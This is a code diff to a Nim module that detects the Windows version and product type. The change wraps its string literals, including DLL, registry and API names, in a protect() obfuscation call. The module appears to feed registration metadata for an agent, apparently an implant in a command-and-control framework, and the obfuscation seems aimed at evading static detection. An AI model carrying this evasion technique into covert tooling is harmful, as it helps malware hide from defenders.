@@ -76,7 +76,7 @@ type
         SERVER = 3
 
 # API Structs
-type OSVersionInfoExW {.importc: "OSVERSIONINFOEXW", header: "<windows.h>".} = object
+type OSVersionInfoExW {.importc: protect("OSVERSIONINFOEXW"), header: protect("<windows.h>").} = object
     dwOSVersionInfoSize: ULONG
     dwMajorVersion: ULONG
     dwMinorVersion: ULONG
@@ -99,58 +99,58 @@ proc getWindowsVersion(info: OSVersionInfoExW, productType: ProductType): string
     if major == 10 and minor == 0:
         if productType == WORKSTATION:
             if build >= 22000:
-                return "Windows 11"
+                return protect("Windows 11")
             else:
-                return "Windows 10"
+                return protect("Windows 10")
 
         else:
             case build:
                 of 20348:
-                    return "Windows Server 2022"
+                    return protect("Windows Server 2022")
                 of 17763:
-                    return "Windows Server 2019"
+                    return protect("Windows Server 2019")
                 of 14393:
-                    return "Windows Server 2016"
+                    return protect("Windows Server 2016")
                 else:
-                    return fmt"Windows Server 10.x (Build: {build})"
+                    return protect("Windows Server 10.x (Build: ") & $build & protect(")")
 
     elif major == 6:
         case minor:
         of 3:
             if productType == WORKSTATION:
-                return "Windows 8.1"
+                return protect("Windows 8.1")
             else:
-                return "Windows Server 2012 R2"
+                return protect("Windows Server 2012 R2")
         of 2:
             if productType == WORKSTATION:
-                return "Windows 8"
+                return protect("Windows 8")
             else:
-                return "Windows Server 2012"
+                return protect("Windows Server 2012")
         of 1:
             if productType == WORKSTATION:
-                return "Windows 7"
+                return protect("Windows 7")
             else:
-                return "Windows Server 2008 R2"
+                return protect("Windows Server 2008 R2") 
         of 0:
             if productType == WORKSTATION:
-                return "Windows Vista"
+                return protect("Windows Vista")
             else:
-                return "Windows Server 2008"
+                return protect("Windows Server 2008") 
         else: 
             discard
 
     elif major == 5:
         if minor == 2:
             if productType == WORKSTATION:
-                return "Windows XP x64 Edition"
+                return protect("Windows XP x64 Edition")
             else:
-                return "Windows Server 2003"
+                return protect("Windows Server 2003")
         elif minor == 1:
-            return "Windows XP"
+            return protect("Windows XP")
     else: 
         discard 
 
-    return "Unknown Windows Version"
+    return protect("Unknown Windows Version") 
 
 proc getProductType(): ProductType =
     # The product key is retrieved from the registry
@@ -162,7 +162,7 @@ proc getProductType(): ProductType =
     #   WinNT    -> Workstation
 
     # Using the 'registry' module, we can get the exact registry value
-    case getUnicodeValue("""SYSTEM\CurrentControlSet\Control\ProductOptions""", "ProductType", HKEY_LOCAL_MACHINE)
+    case getUnicodeValue(protect("""SYSTEM\CurrentControlSet\Control\ProductOptions"""), protect("ProductType"), HKEY_LOCAL_MACHINE)
     of "WinNT":
         return WORKSTATION
     of "ServerNT":
@@ -173,7 +173,7 @@ proc getProductType(): ProductType =
 proc getOSVersion(): string = 
     
     proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS
-        {.cdecl, importc: "RtlGetVersion", dynlib: "ntdll.dll".}
+        {.cdecl, importc: protect("RtlGetVersion"), dynlib: protect("ntdll.dll").}
 
     when defined(windows):
         var osInfo: OSVersionInfoExW
@@ -190,7 +190,7 @@ proc getOSVersion(): string =
         # We instead retrieve the     
         return getWindowsVersion(osInfo, getProductType())
     else:
-        return "Unknown"
+        return protect("Unknown")
 
 proc collectAgentMetadata*(ctx: AgentCtx): AgentRegistrationData = 
     
